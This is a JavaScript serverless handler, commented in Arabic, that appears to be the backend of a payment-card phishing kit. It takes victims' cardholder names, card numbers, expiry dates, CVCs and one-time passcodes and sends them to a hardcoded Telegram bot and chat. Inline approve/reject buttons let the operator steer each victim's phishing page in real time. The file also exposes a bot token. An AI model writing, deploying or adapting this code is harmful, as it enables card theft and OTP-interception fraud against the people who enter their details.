export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  const BOT_TOKEN = "8704506100:AAG1IvxmDba-3v90ujm2ZCc765EROT0T8Qc";
  const CHAT_ID = "8040433133";
  const body = req.body || {};

  // 1. فحص حالة الموافقة أو الرفض عندما تسأل صفحة الـ OTP
  if (req.method === 'GET') {
    const { user_id } = req.query;
    try {
      const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-15&allowed_updates=["callback_query"]`);
      const tgData = await tgRes.json();
      
      let status = 'pending';
      if (tgData.ok && tgData.result) {
        for (const update of tgData.result) {
          if (update.callback_query) {
            const data = update.callback_query.data;
            if (data === `approve_otp_${user_id}` || data === `approve_pay_${user_id}`) status = 'approved';
            if (data === `reject_otp_${user_id}` || data === `reject_pay_${user_id}`) status = 'rejected';
          }
        }
      }
      return res.status(200).json({ status });
    } catch (e) {
      return res.status(200).json({ status: 'pending' });
    }
  }

  // 2. إذا ضغطت أنت على أزرار التليجرام (موافقة / رفض)
  if (body.callback_query) {
    const callback = body.callback_query;
    const callbackData = callback.data;
    const chatId = callback.message.chat.id;
    const messageId = callback.message.message_id;

    let responseText = callback.message.text;
    if (callbackData.includes('approve')) {
      responseText += "\n\n✅ **[تمت الموافقة - تم توجيه العميل للفاتورة]**";
    } else if (callbackData.includes('reject')) {
      responseText += "\n\n❌ **[تم الرفض - تم إظهار خطأ للعميل]**";
    }

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        message_id: messageId,
        text: responseText,
        parse_mode: 'Markdown'
      })
    });

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: callback.id, text: "تم تسجيل قرارك بنجاح!" })
    });

    return res.status(200).json({ ok: true });
  }

  // 3. إرسال بيانات البطاقة (Payment) أو الـ OTP إلى تليجرام مع أزرار التحكم
  let text = '';
  let actionType = 'pay';

  if (body.رمز_التحقق_OTP) {
    actionType = 'otp';
    text = `🔐 *طلب رمز تحقق (OTP) جديد*\n\n` +
           `🔑 الرمز: \`${body.رمز_التحقق_OTP}\`\n` +
           `💳 البطاقة: \`${body.رقم_البطاقة || 'غير متوفر'}\`\n` +
           `👤 الاسم: ${body.اسم_الحامل || 'غير متوفر'}\n` +
           `🆔 معرف المستخدم: \`${body.user_id}\``;
  } else {
    text = `💳 *طلب دفع وبطاقة جديدة*\n\n` +
           `👤 اسم الحامل: ${body.card_name || 'غير محدد'}\n` +
           `💳 رقم البطاقة: \`${body.card_number || ''}\`\n` +
           `📅 الانتهاء: ${body.exp_date || ''}\n` +
           `🔒 CVC: \`${body.cvc || ''}\`\n` +
           `🆔 معرف المستخدم: \`${body.user_id}\``;
  }

  const keyboard = {
    inline_keyboard: [
      [
        { text: "✅ موافقة", callback_data: `approve_${actionType}_${body.user_id}` },
        { text: "❌ رفض", callback_data: `reject_${actionType}_${body.user_id}` }
      ]
    ]
  };

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: text,
        parse_mode: 'Markdown',
        reply_markup: keyboard
      })
    });
    
    return res.status(200).json({ ok: true });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
}
